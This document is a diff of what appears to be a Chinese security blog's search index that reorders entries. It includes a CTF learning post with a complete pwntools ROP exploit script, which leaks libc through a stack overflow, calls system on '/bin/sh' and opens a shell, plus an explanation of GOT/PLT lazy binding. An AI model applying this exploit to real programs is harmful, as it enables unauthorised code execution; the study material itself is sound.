@@ -1708,71 +1708,6 @@ io.interactive()
       </tags>
   </entry>
   <entry>
-    <title>pwn学习之DynELF的使用</title>
-    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8BDynELF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
-<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-return data
-</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
-<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
-<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
-<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
-<pre><code>da$ disassemble vlun_fun 
-Dump of assembler code for function vlun_fun:
-   0x0804844d &lt;+0&gt;:    push   ebp
-   0x0804844e &lt;+1&gt;:    mov    ebp,esp
-   0x08048450 &lt;+3&gt;:    sub    esp,0x98
-   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
-   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
-   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
-   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
-   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
-   0x08048474 &lt;+39&gt;:    leave  
-   0x08048475 &lt;+40&gt;:    ret    
-</code></pre><p>和明显地址是0x0804844d</p>
-<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-elf = ELF(&apos;./test2&apos;)
-plt_write = elf.symbols[&apos;write&apos;]
-plt_read = elf.symbols[&apos;read&apos;]
-vulfun_addr = 0x0804844d
-
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-    return data
-p = process(&apos;./test2&apos;)
-gdb.attach(p,&quot;b *0x804850d&quot;)
-#p = remote(&apos;127.0.0.1&apos;, 10002)
-d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
-system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
-print &quot;system_addr=&quot; + hex(system_addr)
-bss_addr = 0x0804a024
-pppr = 0x804850d
-payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
-payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
-payload2 += &apos;C&apos; * (256 - len(payload2))
-#ss = raw_input()
-print &quot;\n###sending payload2 ...###&quot;
-p.send(payload2)
-p.send(&quot;/bin/sh\0&quot;)
-p.interactive()
-</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pwn之第二更SUCTF2016</title>
     <url>/2016/11/29/pwn%E4%B9%8B%E7%AC%AC%E4%BA%8C%E6%9B%B4SUCTF2016/</url>
     <content><![CDATA[<p><a href="http://pan.baidu.com/s/1ge73Bn9" target="_blank" rel="external">题目链接</a><br><a id="more"></a></p>
@@ -1982,6 +1917,71 @@ r.interactive()
 </code></pre>]]></content>
       <tags>
         <tag>writeup</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn学习之DynELF的使用</title>
+    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8BDynELF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。<br><a id="more"></a></p>
+<h2 id="leak函数"><a href="#leak函数" class="headerlink" title="leak函数"></a>leak函数</h2><pre><code>#!python
+def leak(address):
+    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
+    p.send(payload1)
+    data = p.recv(4)
+    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
+return data
+</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
+<h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
+<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
+<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
+<pre><code>da$ disassemble vlun_fun 
+Dump of assembler code for function vlun_fun:
+   0x0804844d &lt;+0&gt;:    push   ebp
+   0x0804844e &lt;+1&gt;:    mov    ebp,esp
+   0x08048450 &lt;+3&gt;:    sub    esp,0x98
+   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
+   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
+   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
+   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
+   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
+   0x08048474 &lt;+39&gt;:    leave  
+   0x08048475 &lt;+40&gt;:    ret    
+</code></pre><p>和明显地址是0x0804844d</p>
+<h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+elf = ELF(&apos;./test2&apos;)
+plt_write = elf.symbols[&apos;write&apos;]
+plt_read = elf.symbols[&apos;read&apos;]
+vulfun_addr = 0x0804844d
+
+def leak(address):
+    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
+    p.send(payload1)
+    data = p.recv(4)
+    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
+    return data
+p = process(&apos;./test2&apos;)
+gdb.attach(p,&quot;b *0x804850d&quot;)
+#p = remote(&apos;127.0.0.1&apos;, 10002)
+d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
+system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
+print &quot;system_addr=&quot; + hex(system_addr)
+bss_addr = 0x0804a024
+pppr = 0x804850d
+payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
+payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
+payload2 += &apos;C&apos; * (256 - len(payload2))
+#ss = raw_input()
+print &quot;\n###sending payload2 ...###&quot;
+p.send(payload2)
+p.send(&quot;/bin/sh\0&quot;)
+p.interactive()
+</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
+]]></content>
+      <tags>
         <tag>pwn</tag>
       </tags>
   </entry>
@@ -3840,6 +3840,67 @@ print(flag)
       </tags>
   </entry>
   <entry>
+    <title>延迟绑定技术原理</title>
+    <url>/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</url>
+    <content><![CDATA[<p>动态链接比静态链接灵活，但牺牲了性能，据统计ELF程序在静态链接下比动态库快大约1%~5%。<br><a id="more"></a><br>主要原因是，动态链接下对于全局和静态数据的访问都要进行复杂的GOT定位，然后间接寻址，对于模块间的调用也要先定位GOT，然后进行间接跳转。<br>另外，动态链接的链接过程是在运行时完成的，动态链接器会寻找并转载所需要的对象，然后进行符号查找地址重定位等工作。</p>
+<p>延迟绑定的实现步骤如下：</p>
+<p>建立一个 GOT.PLT 表，该表用来放全局函数的实际地址，但最开始时，该里面放的不是真实的地址而是一个跳转，接下来会讲。<br>对每一个全局函数，链接器生成一个与之相对应的影子函数，如 fun@plt。<br>所有对 fun 的调用，都换成对 fun@plt 的调用，每个fun@plt 长成如下样子：</p>
+<pre><code>fun@plt:
+jmp *(fun@got.plt)
+push index
+jmp _init
+</code></pre><p>其中第一条指令直接从 got.plt 中去拿真实的函数地址，如果已经之前已经发生过调用，got.plt 就已经保存了真实的地址，如果是第一次调用，则 got.plt 中放的是 fun@plt 中的第二条指令，这就使得当执行第一次调用时，fun@plt中的第一条指令其实什么事也没做，直接继续往下执行，第二条指令的作用是把当前要调用的函数在 got.plt 中的编号作为参数传给 _init()，而 _init() 这个函数则用于把 fun 进行重定位，然后把结果写入到 got.plt 相应的地方，最后直接跳过去该函数。</p>
+<p>仍然是使用前面的例子，我们看看 g_func2 是怎样调用 g_func 的:</p>
+<pre><code>0000052f &lt;g_func2&gt;:
+ 52f:   55                      push   %ebp
+ 530:   89 e5                   mov    %esp,%ebp
+ 532:   53                      push   %ebx
+ 533:   83 ec 14                sub    $0x14,%esp
+ 536:   e8 00 00 00 00          call   53b &lt;g_func2+0xc&gt;
+ 53b:   5b                      pop    %ebx
+ 53c:   81 c3 91 11 00 00       add    $0x1191,%ebx
+ 542:   c7 45 f8 02 00 00 00    movl   $0x2,0xfffffff8(%ebp) // a = 2
+ 549:   83 ec 0c                sub    $0xc,%esp
+ 54c:   6a 03                   push   $0x3 // push argument 3 for g_func.
+ 54e:   e8 d5 fe ff ff          call   428 &lt;g_func@plt&gt;
+ 553:   83 c4 10                add    $0x10,%esp
+ 556:   89 45 f4                mov    %eax,0xfffffff4(%ebp)
+ 559:   8b 45 f4                mov    0xfffffff4(%ebp),%eax
+ 55c:   03 45 f8                add    0xfffffff8(%ebp),%eax
+ 55f:   8b 5d fc                mov    0xfffffffc(%ebp),%ebx
+ 562:   c9                      leave  
+ 563:   c3                      ret 
+</code></pre><p>如上汇编，指令 536, 53b, 53c, 用于计算 got.plt 的具体位置，计算方式与前面对数据的访问原理是一样的，经计算此时, %ebx = 0x53b + 0x1191 = 0x16cc, 注意指令 54e， 该指令调用了函数 g_func@plt:</p>
+<pre><code>00000428 &lt;g_func@plt&gt;:
+ 428:   ff a3 0c 00 00 00       jmp    *0xc(%ebx)
+ 42e:   68 00 00 00 00          push   $0x0
+ 433:   e9 e0 ff ff ff          jmp    418 &lt;_init+0x18&gt;
+</code></pre><p>注意到此时， %ebx 中放的是 got.plt 的地址，g_func@plt 的第一条指令用于获取 got.plt 中 func 的具体地址， func 放在 0xc + %ebx = 0xc + 0x16cc = 0x16d8, 这个地址里放的是什么呢？我们查一下重定位表：</p>
+<pre><code>-bash-3.00$ objdump -R liba.so
+
+liba.so:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+000016e0 R_386_RELATIVE    *ABS*
+000016e4 R_386_RELATIVE    *ABS*
+000016bc R_386_GLOB_DAT    g_share
+000016c0 R_386_GLOB_DAT    __cxa_finalize
+000016c4 R_386_GLOB_DAT    _Jv_RegisterClasses
+000016c8 R_386_GLOB_DAT    __gmon_start__
+000016d8 R_386_JUMP_SLOT   g_func
+000016dc R_386_JUMP_SLOT   __cxa_finalize
+</code></pre><p>可见，该地址里放的就是 g_func 的具体地址，那此时 0x16d8 放的是真正的地址了吗？我们再看看 got.plt:</p>
+<pre><code>Contents of section .got.plt:
+ 16cc fc150000 00000000 00000000 2e040000  ................
+ 16dc 3e040000 
+</code></pre><p>16d8 处的内容是: 2e040000, 小端序，换回整形就是 0x000042e, 该地址就是 fun@plt 的第二条指令！</p>
+]]></content>
+      <tags>
+        <tag>System</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>栈溢出之利用__stack_chk_fail</title>
     <url>/2017/03/04/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8B%E5%88%A9%E7%94%A8-stack-chk-fail/</url>
     <content><![CDATA[<p>程序的主函数很明显_IO_gets存在栈溢出。<br><a id="more"></a><br>查看开启的保护机制，开了一大堆。。。</p>
@@ -3995,67 +4056,6 @@ print flag
       </tags>
   </entry>
   <entry>
-    <title>延迟绑定技术原理</title>
-    <url>/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</url>
-    <content><![CDATA[<p>动态链接比静态链接灵活，但牺牲了性能，据统计ELF程序在静态链接下比动态库快大约1%~5%。<br><a id="more"></a><br>主要原因是，动态链接下对于全局和静态数据的访问都要进行复杂的GOT定位，然后间接寻址，对于模块间的调用也要先定位GOT，然后进行间接跳转。<br>另外，动态链接的链接过程是在运行时完成的，动态链接器会寻找并转载所需要的对象，然后进行符号查找地址重定位等工作。</p>
-<p>延迟绑定的实现步骤如下：</p>
-<p>建立一个 GOT.PLT 表，该表用来放全局函数的实际地址，但最开始时，该里面放的不是真实的地址而是一个跳转，接下来会讲。<br>对每一个全局函数，链接器生成一个与之相对应的影子函数，如 fun@plt。<br>所有对 fun 的调用，都换成对 fun@plt 的调用，每个fun@plt 长成如下样子：</p>
-<pre><code>fun@plt:
-jmp *(fun@got.plt)
-push index
-jmp _init
-</code></pre><p>其中第一条指令直接从 got.plt 中去拿真实的函数地址，如果已经之前已经发生过调用，got.plt 就已经保存了真实的地址，如果是第一次调用，则 got.plt 中放的是 fun@plt 中的第二条指令，这就使得当执行第一次调用时，fun@plt中的第一条指令其实什么事也没做，直接继续往下执行，第二条指令的作用是把当前要调用的函数在 got.plt 中的编号作为参数传给 _init()，而 _init() 这个函数则用于把 fun 进行重定位，然后把结果写入到 got.plt 相应的地方，最后直接跳过去该函数。</p>
-<p>仍然是使用前面的例子，我们看看 g_func2 是怎样调用 g_func 的:</p>
-<pre><code>0000052f &lt;g_func2&gt;:
- 52f:   55                      push   %ebp
- 530:   89 e5                   mov    %esp,%ebp
- 532:   53                      push   %ebx
- 533:   83 ec 14                sub    $0x14,%esp
- 536:   e8 00 00 00 00          call   53b &lt;g_func2+0xc&gt;
- 53b:   5b                      pop    %ebx
- 53c:   81 c3 91 11 00 00       add    $0x1191,%ebx
- 542:   c7 45 f8 02 00 00 00    movl   $0x2,0xfffffff8(%ebp) // a = 2
- 549:   83 ec 0c                sub    $0xc,%esp
- 54c:   6a 03                   push   $0x3 // push argument 3 for g_func.
- 54e:   e8 d5 fe ff ff          call   428 &lt;g_func@plt&gt;
- 553:   83 c4 10                add    $0x10,%esp
- 556:   89 45 f4                mov    %eax,0xfffffff4(%ebp)
- 559:   8b 45 f4                mov    0xfffffff4(%ebp),%eax
- 55c:   03 45 f8                add    0xfffffff8(%ebp),%eax
- 55f:   8b 5d fc                mov    0xfffffffc(%ebp),%ebx
- 562:   c9                      leave  
- 563:   c3                      ret 
-</code></pre><p>如上汇编，指令 536, 53b, 53c, 用于计算 got.plt 的具体位置，计算方式与前面对数据的访问原理是一样的，经计算此时, %ebx = 0x53b + 0x1191 = 0x16cc, 注意指令 54e， 该指令调用了函数 g_func@plt:</p>
-<pre><code>00000428 &lt;g_func@plt&gt;:
- 428:   ff a3 0c 00 00 00       jmp    *0xc(%ebx)
- 42e:   68 00 00 00 00          push   $0x0
- 433:   e9 e0 ff ff ff          jmp    418 &lt;_init+0x18&gt;
-</code></pre><p>注意到此时， %ebx 中放的是 got.plt 的地址，g_func@plt 的第一条指令用于获取 got.plt 中 func 的具体地址， func 放在 0xc + %ebx = 0xc + 0x16cc = 0x16d8, 这个地址里放的是什么呢？我们查一下重定位表：</p>
-<pre><code>-bash-3.00$ objdump -R liba.so
-
-liba.so:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-000016e0 R_386_RELATIVE    *ABS*
-000016e4 R_386_RELATIVE    *ABS*
-000016bc R_386_GLOB_DAT    g_share
-000016c0 R_386_GLOB_DAT    __cxa_finalize
-000016c4 R_386_GLOB_DAT    _Jv_RegisterClasses
-000016c8 R_386_GLOB_DAT    __gmon_start__
-000016d8 R_386_JUMP_SLOT   g_func
-000016dc R_386_JUMP_SLOT   __cxa_finalize
-</code></pre><p>可见，该地址里放的就是 g_func 的具体地址，那此时 0x16d8 放的是真正的地址了吗？我们再看看 got.plt:</p>
-<pre><code>Contents of section .got.plt:
- 16cc fc150000 00000000 00000000 2e040000  ................
- 16dc 3e040000 
-</code></pre><p>16d8 处的内容是: 2e040000, 小端序，换回整形就是 0x000042e, 该地址就是 fun@plt 的第二条指令！</p>
-]]></content>
-      <tags>
-        <tag>System</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>梆梆&amp;爱加密java反调试绕过</title>
     <url>/2020/05/19/%E6%A2%86%E6%A2%86-%E7%88%B1%E5%8A%A0%E5%AF%86java%E5%8F%8D%E8%B0%83%E8%AF%95%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<p>各位道友有没有在越过重重native反调试脱掉壳之后想要调试smali的过程中突然发现在使用AndroidStdio动态调试smali的时候只要一挂载APP就会崩溃，本篇主要整理一下在调试梆梆&amp;爱加密过程中遇到的java层反调试以及绕过的方式<br><a id="more"></a></p>
@@ -4094,13 +4094,6 @@ OFFSET   TYPE              VALUE
         <tag>反调试</tag>
         <tag>反反调试</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>重出江湖</title>
-    <url>/2020/04/29/%E9%87%8D%E5%87%BA%E6%B1%9F%E6%B9%96/</url>
-    <content><![CDATA[<p>经2017年参加实习之后，由于太忙（懒）blog就荒废了，参加工作以来发现搞技术果然还是得写一写记一记，如今准备重出江湖。<br><a id="more"></a></p>
-<p>今后一段时间的bolg技术重点应该在Android&amp;iOS安全方面，希望能学到更多的技术，也希望能帮到更多走在研究技术路上的小伙伴们。</p>
-]]></content>
   </entry>
   <entry>
     <title>程序的动态链接和静态链接</title>
@@ -4283,5 +4276,12 @@ void swap(int *a,int *b)
         <tag>动态链接</tag>
         <tag>静态链接</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>重出江湖</title>
+    <url>/2020/04/29/%E9%87%8D%E5%87%BA%E6%B1%9F%E6%B9%96/</url>
+    <content><![CDATA[<p>经2017年参加实习之后，由于太忙（懒）blog就荒废了，参加工作以来发现搞技术果然还是得写一写记一记，如今准备重出江湖。<br><a id="more"></a></p>
+<p>今后一段时间的bolg技术重点应该在Android&amp;iOS安全方面，希望能学到更多的技术，也希望能帮到更多走在研究技术路上的小伙伴们。</p>
+]]></content>
   </entry>
 </search>
